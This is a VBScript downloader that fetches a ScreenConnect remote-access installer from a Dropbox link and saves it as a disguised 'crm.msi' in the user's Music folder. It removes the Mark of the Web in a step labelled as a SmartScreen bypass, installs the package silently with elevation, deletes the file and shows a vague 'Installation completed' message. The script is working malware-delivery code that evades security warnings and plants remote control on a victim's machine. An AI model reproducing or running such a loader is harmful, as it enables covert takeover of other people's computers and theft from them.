Option Explicit

' --- Variables ---
Dim url, savePath, musicPath, updateFolder
Dim fso, shell, http, stream, objShellApp
Dim psCmd

' --- Configuration ---
url = "https://www.dl.dropboxusercontent.com/scl/fi/jvubiy2qfaxo4rqjpt7k9/ScreenConnect.ClientSetup.msi?rlkey=n6bnt71jsmqzngshztvpy0gv9&st=rkhay70s&dl=1"

' --- Initialize Objects (same as working script) ---
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' --- Get Music folder path and create update folder ---
musicPath = shell.SpecialFolders("MyMusic")
updateFolder = musicPath & "\update"

If Not fso.FolderExists(updateFolder) Then
    fso.CreateFolder updateFolder
End If

savePath = updateFolder & "\crm.msi"

If fso.FileExists(savePath) Then 
    fso.DeleteFile savePath, True
End If

' --- Download (same as working script) ---
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile savePath, 2
    stream.Close
    
    ' Wait for file write to complete
    WScript.Sleep 2000
    
    ' --- SMARTSCREEN BYPASS: Remove Mark of the Web ---
    ' This removes the Zone.Identifier ADS that triggers SmartScreen
    On Error Resume Next
    psCmd = "powershell -Command ""Remove-Item -Path '" & savePath & "' -Stream Zone.Identifier -Force -ErrorAction SilentlyContinue"""
    shell.Run psCmd, 0, True
    On Error GoTo 0
    
    ' --- INSTALL (same as working script) ---
    Set objShellApp = CreateObject("Shell.Application")
    
    ' This triggers the legitimate Windows Installer UAC elevation prompt
    ' Using /quiet for completely silent installation (no UI)
    objShellApp.ShellExecute "msiexec", "/i """ & savePath & """ /quiet", "", "runas", 0
    
    ' Wait for installation to start
    WScript.Sleep 5000
    
    ' --- Clean up (same as working script) ---
    On Error Resume Next
    If fso.FileExists(savePath) Then
        fso.DeleteFile savePath, True
    End If
    On Error GoTo 0
    
    MsgBox "Installation completed successfully!", vbInformation, "Success"
    
Else
    MsgBox "Download failed. Status: " & http.Status, vbCritical, "Error"
    WScript.Quit
End If